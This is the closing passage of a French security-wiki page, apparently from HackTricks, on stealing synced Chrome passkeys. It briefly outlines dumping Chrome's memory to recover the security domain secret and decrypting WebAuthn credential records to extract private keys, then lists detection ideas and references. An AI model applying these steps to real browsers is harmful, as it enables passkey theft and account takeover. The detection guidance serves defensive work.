   - Surveiller la recréation ou la modification de `passkey_enclave_state`, puis vider la mémoire de Chrome lorsque le texte en clair du **secret du domaine de sécurité (SDS)** y est présent.
   - Utiliser le SDS récupéré pour déchiffrer les champs chiffrés de chaque enregistrement `WebauthnCredentialSpecifics` et récupérer les clés privées WebAuthn portables.

### Idées pour le DFIR / la détection

- Surveiller la **suppression/recréation** de `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Déclencher une alerte en cas d’accès anormal à **`Sync Data\LevelDB`** de Chrome par des processus autres que le navigateur.
- Déclencher une alerte en cas de **vidage de la mémoire de Chrome** ou d’accès suspect à la mémoire entre processus.
- Examiner les demandes répétées de **code PIN de récupération de Google Password Manager** ou les réenrôlements inattendus.
- Garder à l’esprit que le **`signCount`** de WebAuthn est souvent peu utile pour les passkeys synchronisées, car il peut rester constant ; la détection classique des clones est donc peu efficace.

## References

- [1] [Unit 42 – Enquête sur des années d’opérations non détectées ciblant des secteurs de grande valeur](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo : hameçonnage par macro VBA Word via SMTP → déchiffrement des identifiants hMailServer → Veeam CVE-2023-27532 vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Au cœur d’Ink Dragon : révélation du réseau de relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey : une nouvelle surface d’attaque dans l’authentification sans mot de passe](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / stockage des clés CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows : attaques sur les systèmes et réseaux Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Comment fonctionne réellement le magasin de données Active Directory : au cœur de NTDS.dit (partie 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Extraction à distance des mots de passe de Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho étoffe son arsenal de cyberespionnage avec le toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Fonction CreateFileW et `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Mode de sauvegarde Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [FAQ Telegram – mettre fin aux sessions actives](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
